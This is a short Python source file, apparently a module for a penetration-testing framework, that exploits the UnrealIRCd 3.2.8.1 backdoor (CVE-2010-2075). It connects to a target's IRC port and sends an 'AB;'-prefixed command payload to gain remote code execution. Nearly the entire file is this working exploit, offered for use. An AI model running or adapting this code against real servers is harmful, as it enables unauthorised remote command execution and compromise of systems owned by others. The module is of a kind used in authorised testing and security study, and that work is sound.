import socket

from module import Type, RemoteCodeExecutionModule


class UnrealIRCBackdoor(RemoteCodeExecutionModule):

    def __init__(self):
        super().__init__("unreal_irc_backdoor",
                         ["unreal", "irc", "backdoor", "rce", "3.2.8.1", "cve-2010-2075"],
                         "unreal irc backdoor",
                         references=["https://nvd.nist.gov/vuln/detail/CVE-2010-2075",
                                     "https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2010-2075"])

        self.add_option("RHOST", "target host", required=True, type=Type.host)
        self.add_option("RPORT", "target port", required=True, default=6667, type=Type.int)
        self.add_option("TIMEOUT", "timeout", required=True, default=5, type=Type.int)

    def exploit(self):
        ip = socket.gethostbyname(self.rhost)
        try:
            with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
                s.settimeout(self.timeout)
                s.connect((ip, self.rport))
                s.send(f"AB; {self.get_payload()}\n".encode())
                data = s.recv(1024)
                if data != "":
                    print("[+] exploit sent successfully")
        except (ConnectionRefusedError, TimeoutError):
            print("[-] error while connecting to the target host")
